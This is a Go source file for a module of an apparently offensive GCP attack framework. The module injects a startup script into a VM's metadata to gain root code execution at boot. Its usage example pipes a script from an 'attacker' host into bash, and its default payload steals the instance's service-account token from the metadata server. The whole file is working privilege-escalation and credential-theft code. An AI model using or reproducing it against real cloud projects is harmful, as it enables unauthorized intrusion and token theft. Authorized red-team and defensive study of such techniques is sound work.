package compute

import (
	"context"
	"fmt"

	computev1 "google.golang.org/api/compute/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&EscalateStartupScript{})
}

// EscalateStartupScript injects a startup script on a VM instance for code execution.
type EscalateStartupScript struct{}

func (m *EscalateStartupScript) Info() module.Info {
	return module.Info{
		Name:         "privesc.compute.escalate-startup-script",
		Tactic:       module.TacticPrivesc,
		Service:      "compute",
		Description:  "Inject a startup script on a VM for code execution as root",
		RequiresAuth: true,
		AttackID:     "T1059",
	}
}

func (m *EscalateStartupScript) Run(ctx module.RunContext) error {
	instance := ctx.Flags["instance"]
	zone := ctx.Flags["zone"]
	script := ctx.Flags["script"]

	if instance == "" || zone == "" {
		output.Warn("Usage: run privesc.compute.escalate-startup-script --instance <name> --zone <zone> --script <bash>")
		output.Info("Example: --instance my-vm --zone us-central1-a --script 'curl http://attacker/shell.sh | bash'")
		return nil
	}

	if script == "" {
		script = "#!/bin/bash\ncurl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google' > /tmp/token.json"
	}

	project := ""
	if len(ctx.Projects) > 0 {
		project = ctx.Projects[0]
	}
	if project == "" {
		output.Warn("No project specified.")
		return nil
	}

	svc, err := computev1.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create compute client: %w", err)
	}

	output.Warn("Injecting startup script on %s/%s/%s", project, zone, instance)

	// Get current metadata.
	inst, err := svc.Instances.Get(project, zone, instance).Do()
	if err != nil {
		return fmt.Errorf("get instance: %w", err)
	}

	// Update metadata with startup script.
	metadata := inst.Metadata
	found := false
	for _, item := range metadata.Items {
		if item.Key == "startup-script" {
			item.Value = &script
			found = true
			break
		}
	}
	if !found {
		metadata.Items = append(metadata.Items, &computev1.MetadataItems{
			Key:   "startup-script",
			Value: &script,
		})
	}

	_, err = svc.Instances.SetMetadata(project, zone, instance, metadata).Do()
	if err != nil {
		return fmt.Errorf("set metadata: %w", err)
	}

	output.Success("Startup script injected on %s", instance)
	output.Info("Script will execute on next VM boot (or reset).")

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "privesc.compute.escalate-startup-script",
			Severity:    module.SevCritical,
			Title:       "Startup script injected on VM",
			Description: fmt.Sprintf("Injected startup script on %s in %s/%s for code execution", instance, project, zone),
			Resource:    instance,
			Project:     project,
		}
	}

	return nil
}
